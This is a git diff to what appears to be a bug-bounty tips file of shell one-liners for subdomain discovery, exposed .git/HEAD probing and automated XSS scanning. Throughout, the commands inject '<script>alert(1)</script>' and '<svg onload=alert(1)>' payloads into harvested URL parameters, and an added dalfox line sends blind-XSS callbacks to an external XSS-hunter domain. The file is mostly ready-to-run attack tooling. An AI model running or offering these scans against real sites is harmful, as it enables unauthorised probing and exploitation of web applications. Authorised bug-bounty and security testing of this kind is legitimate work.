@@ -5,6 +5,11 @@
 ```bash
 subfinder -d target.com -silent | httpx -silent -o urls.txt
 ```
+## Search Subdomain using Gospider
+> https://github.com/KingOfBugbounty/KingOfBugBountyTips/
+```bash
+gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
+```
 
 ## find .git/HEAD
 > @ofjaaah
@@ -12,7 +17,7 @@ subfinder -d target.com -silent | httpx -silent -o urls.txt
 curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
 ```
 
-# Check .git/HEAD
+## Check .git/HEAD
 > @ofjaaah
 ```bash
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
@@ -78,7 +83,7 @@ echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -thr
 ```bash
 waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 ```
-
+`or`
 ```bash
 gospider -S target.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 ```
@@ -94,6 +99,12 @@ gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | gre
 ```bash
 httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
 ```
+## Automating XSS using Dalfox, GF and Waybackurls
+> [Automating XSS using Dalfox, GF and Waybackurls](https://medium.com/bugbountywriteup/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75)
+```bash
+cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
+```
+
 
 ## Dump In-Scope Assests from Bounty Program
 ### BugCrowd Programs
